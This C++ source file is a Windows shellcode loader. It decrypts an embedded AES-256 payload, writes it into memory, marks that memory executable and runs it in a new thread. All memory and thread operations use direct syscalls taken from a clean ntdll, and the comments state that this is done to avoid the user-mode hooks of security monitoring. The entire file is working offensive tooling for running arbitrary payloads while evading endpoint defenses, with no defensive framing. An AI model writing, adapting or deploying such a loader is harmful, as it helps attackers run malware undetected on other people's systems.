#include <windows.h>
#include <cstdint>
#include <vector>
#include "syscalls.h"
#include "aes.h"
#include "shellcode.h"

// AES-encrypted shellcode loader using direct dynamic syscalls.
//
// 1. Decrypt the embedded AES-256-CBC payload in memory (CNG/BCrypt).
// 2. Allocate RW memory, write the shellcode, flip it to RX.
// 3. Execute it in a new thread.
// All memory/thread operations go through direct syscalls resolved from a clean
// ntdll, avoiding user-mode hooks on NtAllocateVirtualMemory & friends.

int main()
{
    if (!syscall::Initialize())
        return 1;

    std::vector<uint8_t> shellcode;
    if (!AesDecrypt(encrypted_shellcode, sizeof(encrypted_shellcode), aes_key, sizeof(aes_key), aes_iv, sizeof(aes_iv), shellcode))
        return 2;

    if (shellcode.empty())
        return 3;

    // NtCurrentProcess() pseudo-handle.
    HANDLE process = reinterpret_cast<HANDLE>(-1);

    PVOID base = nullptr;
    SIZE_T regionSize = shellcode.size();

    NTSTATUS st = syscall::NtAllocateVirtualMemory(process, &base, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (st < 0)
        return 4;

    SIZE_T written = 0;
    st = syscall::NtWriteVirtualMemory(process, base, shellcode.data(), shellcode.size(), &written);
    if (st < 0)
        return 5;

    PVOID protectBase = base;
    SIZE_T protectSize = shellcode.size();
    ULONG oldProtect = 0;
    st = syscall::NtProtectVirtualMemory(process, &protectBase, &protectSize, PAGE_EXECUTE_READ, &oldProtect);
    if (st < 0)
        return 6;

    HANDLE thread = nullptr;
    st = syscall::NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, nullptr, process, base, nullptr, 0, 0, 0, 0, nullptr);
    if (st < 0)
        return 7;

    syscall::NtWaitForSingleObject(thread, FALSE, nullptr); // wait indefinitely
    syscall::NtClose(thread);

    PVOID freeBase = base;
    SIZE_T freeSize = 0;
    syscall::NtFreeVirtualMemory(process, &freeBase, &freeSize, MEM_RELEASE);

    return 0;
}
